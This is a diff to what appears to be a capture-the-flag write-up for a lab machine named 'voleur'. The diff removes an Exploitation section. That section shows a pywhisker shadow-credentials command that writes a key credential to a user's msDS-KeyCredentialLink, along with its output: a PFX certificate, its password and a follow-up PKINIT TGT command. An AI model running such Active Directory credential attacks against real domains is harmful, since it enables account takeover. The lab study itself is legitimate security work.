@@ -277,36 +277,6 @@ INFO: Compressing output into 20261006005501_bloodhound.zip
 
 ### Exploitation
 
-
-```shell
-sudo ntpdate DC.voleur.htb && python3 pywhisker.py -d "voleur.htb" -u "svc_ldap" --target "lacey.miller" --action "add" -k --dc-ip 10.129.232.130 --dc-host DC.voleur.htb -v
-2026-10-06 01:18:08.997778 (-0400) +28858.196057 +/- 0.015583 DC.voleur.htb 10.129.232.130 s1 no-leap
-CLOCK: time stepped by 28858.196057
-/home/kali/tools/pywhisker/pywhisker/pywhisker.py:356: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
-  now = datetime.datetime.utcnow()
-[*] Searching for the target account
-[*] Target user found: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
-[*] Generating certificate
-[*] Certificate generated
-[*] Generating KeyCredential
-[*] KeyCredential generated with DeviceID: 7a4db2e8-2afd-20d4-d786-fd85c858bd7c
-[*] Updating the msDS-KeyCredentialLink attribute of lacey.miller
-[+] Updated the msDS-KeyCredentialLink attribute of the target object
-[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: v9sSCXdM
-[VERBOSE] No pass was provided. The certificate will be stored with the password: oPOUL9gi633SqmNH6dXP
-[*] Converting PEM -> PFX with cryptography: v9sSCXdM.pfx
-[+] PFX exportiert nach: v9sSCXdM.pfx
-[i] Passwort für PFX: oPOUL9gi633SqmNH6dXP
-[+] Saved PFX (#PKCS12) certificate & key at path: v9sSCXdM.pfx
-[*] Must be used with password: oPOUL9gi633SqmNH6dXP
-[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
-[VERBOSE] Run the following command to obtain a TGT
-[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx v9sSCXdM.pfx -pfx-pass oPOUL9gi633SqmNH6dXP voleur.htb/lacey.miller v9sSCXdM.ccache
-
-```
-
-in theory should have worked but the machine is bugged as fuck
-
 ## Targeted kerberoast:
 
 ```
